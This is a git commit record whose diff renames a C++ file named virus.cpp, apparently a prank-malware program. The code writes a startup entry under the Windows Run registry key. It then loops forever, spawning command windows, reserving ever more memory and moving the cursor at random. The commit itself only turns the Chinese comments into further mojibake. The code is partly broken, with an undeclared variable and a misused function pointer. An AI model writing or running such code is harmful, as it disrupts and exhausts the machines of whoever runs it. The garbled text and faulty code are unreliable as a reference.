005c7c7033c4cb156019fcdf12525af1e84147bf
zhiziqxd <166890319+zhiziqxd@users.noreply.github.com>
2024-07-17 18:02:00 +0800

    Update and rename virus.cpp to code/virus.cpp

--- code/virus.cpp
+++ code/virus.cpp
@@ -3,17 +3,17 @@
 #include <cstdlib>
 #include <windows.h>
 using namespace std;
-vector<string> a;//ºÄÄÚ´æ
+vector<string> a;//ÂºÃ„Ã„ÃšÂ´Ã¦
 long long int cnt;
 int main(){
   HKEY hKey;
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
   RegSetValueEx(hKey, "Writing to the Registry Example",0,REG_SZ,(const unsigned char*)system,sizeof(system));
   RegCloseKey(hKey);
-	freopen("ºÄÄÚ´æ.in","w",stdout);
+	freopen("ÂºÃ„Ã„ÃšÂ´Ã¦.in","w",stdout);
 	while(true){
 		system("start cmd");
-		cout<<"ºÄÄÚ´æ";
+		cout<<"ÂºÃ„Ã„ÃšÂ´Ã¦";
 		cnt+=1000000;
 		vec.reserve(cnt);
 		SetCursorPos(rand()%1000,rand()%1000);
